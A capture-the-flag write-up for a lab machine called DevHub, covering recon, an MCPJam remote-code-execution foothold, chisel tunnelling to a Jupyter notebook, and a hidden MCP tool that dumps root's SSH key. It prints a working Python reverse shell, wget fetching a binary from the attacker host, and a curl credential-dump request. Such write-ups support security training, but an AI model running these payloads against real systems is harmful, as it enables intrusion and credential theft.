# DevHub

## Recon

### Full Port Scan

```shell
sudo nmap -sT --min-rate 10000 -p- 10.129.245.216 -oA nmapscan/ports
```

```
Nmap scan report for 10.129.245.216
Host is up (0.027s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
6274/tcp open  unknown
```

Three ports are open: 22 (SSH), 80 (HTTP), and 6274.

### Service Detection

```shell
sudo nmap -sT -sC -sV -O -p22,80,6274 10.129.245.216 -oA nmapscan/detail
```

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 35:78:2e:79:0d:87:13:05:2f:53:8e:e7:3c:55:b6:4c (ECDSA)
|_  256 dd:56:8e:bc:da:b8:38:3e:9a:cd:0b:74:ee:53:85:f8 (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://devhub.htb/
6274/tcp open  unknown
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   GetRequest: 
|     HTTP/1.1 200 OK
|     access-control-allow-credentials: true
|     content-length: 466
|     ...
```

Port 80 redirects to the virtual host `devhub.htb`, so add it to `/etc/hosts`:

```shell
echo "10.129.245.216 devhub.htb" | sudo tee -a /etc/hosts
```

## Foothold: MCPJam RCE

Browse to `http://devhub.htb`. The site indicates that port 6274 is active and references an internal service on port 8888.

![](assets/Pasted%20image%2020260617022629.png)

Access `http://devhub.htb:6274`. It is **MCPJam** version **1.4.2**, which is vulnerable to **CVE-2026-23744** (RCE).

![](assets/Pasted%20image%2020260617030726.png)

Start a listener and run the public PoC:

```
$ rlwrap ncat -nvlp 9001
Ncat: Version 7.99 ( https://nmap.org/ncat )
Ncat: Listening on [::]:9001
Ncat: Listening on 0.0.0.0:9001
Ncat: Connection from 10.129.245.216:53384.
whoami
mcp-dev
```

This gives an initial shell as the `mcp-dev` user.

## Lateral Movement: mcp-dev to analyst

Enumerate the other users and look for processes owned by them:

```shell
ls /home          # reveals the user "analyst"
ps aux | grep analyst
```

![](assets/Pasted%20image%2020260617023343.png)

`analyst` is running a service bound to `127.0.0.1:8888` (the internal port referenced on the website). It is not reachable from the outside, so forward it back to the attack machine with **chisel**.

Serve the chisel binary from the attack machine:

```shell
python3 -m http.server 8000
```

Start the chisel server in reverse mode:

```shell
./chisel server --port 4444 --reverse
```

On the target, pull chisel and connect back, forwarding the internal 8888 to the attack machine:

```shell
wget http://10.10.15.172:8000/chisel -O /tmp/chisel
chmod +x /tmp/chisel
/tmp/chisel client 10.10.15.172:4444 R:8888:127.0.0.1:8888
```

Now access `http://127.0.0.1:8888` locally. It is a Jupyter Notebook. Authenticate with the token:

```
a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7
```

A Jupyter notebook gives arbitrary code execution as the user running the kernel. Verify the identity first:

```python
import os
os.system('whoami')
```

![](assets/Pasted%20image%2020260617024545.png)

It runs as `analyst`. Start a listener and spawn a reverse shell from the notebook:

```shell
rlwrap ncat -nvlp 5555
```

```python
import socket,subprocess,os,pty
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.15.172",5555))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn("/bin/bash")
```

Read the user flag as `analyst`.

![](assets/Pasted%20image%2020260617024721.png)

## Privilege Escalation: Hidden MCP Tool

As `analyst`, inspect the source of the root-owned service at `/opt/opsmcp/server.py`. It exposes hidden tools that are callable but not listed in `/tools/list`:

```python
# API Key for authentication
VALID_API_KEY = "opsmcp_secret_key_4f5a6b7c8d9e0f1a"

# Hidden tools (not in /tools/list but callable)
HIDDEN_TOOLS = {
    "ops._admin_dump": {
        "description": "Emergency credential dump - INTERNAL ONLY",
        "parameters": {"target": "string", "confirm": "boolean"}
    },
    "ops._debug_mode": {
        "description": "Enable debug mode",
        "parameters": {}
    }
}

elif tool_name == "ops._admin_dump":
        target = args.get('target', '')
        confirm = args.get('confirm', False)
        
        if not confirm:
            return jsonify({
                "error": "Confirmation required",
                "usage": "Set confirm=true to proceed",
                "warning": "This dumps sensitive credentials"
            })
        
        if target == "ssh_keys":
            try:
                with open('/root/.ssh/id_rsa', 'r') as f:
                    key_data = f.read()
                return jsonify({
                    "target": "ssh_keys",
                    "root_private_key": key_data,
                    "note": "Emergency recovery key dump"
                })

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=5000, debug=False)
```

Three things stand out. The service binds to `127.0.0.1:5000`, so it is only reachable from the host itself, which is exactly where we already have an `analyst` shell. The hardcoded API key gives access to the hidden tools. And `ops._admin_dump` with `target=ssh_keys` makes the root-owned service read and return `/root/.ssh/id_rsa`. Since the service runs as root, it can read root's private key for us.

Call the hidden tool directly from the target with the leaked API key:

```shell
curl -s -X POST http://127.0.0.1:5000/tools/call -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" -H "Content-Type: application/json" -d '{"name":"ops._admin_dump","arguments":{"target":"ssh_keys","confirm":true}}'
```

![](assets/Pasted%20image%2020260617025554.png)

This returns root's private SSH key.

## Root

Save the key locally, fix its permissions, and log in as root:

```shell
$ chmod 600 root_key
$ ssh -i root_key root@10.129.245.216
```

Read the root flag.

![](assets/Pasted%20image%2020260617030138.png)

## Summary

- **Foothold:** RCE in MCPJam 1.4.2 (CVE-2026-23744) on port 6274, giving a shell as `mcp-dev`.
- **Lateral movement:** `analyst` runs an internal Jupyter Notebook on `127.0.0.1:8888`. Forward it with chisel, authenticate with the exposed token, and execute code as `analyst`.
- **Privesc:** A root-owned opsmcp service exposes a hidden `ops._admin_dump` tool protected only by a hardcoded API key. Calling it with `target=ssh_keys` dumps root's private key, allowing a direct SSH login as root.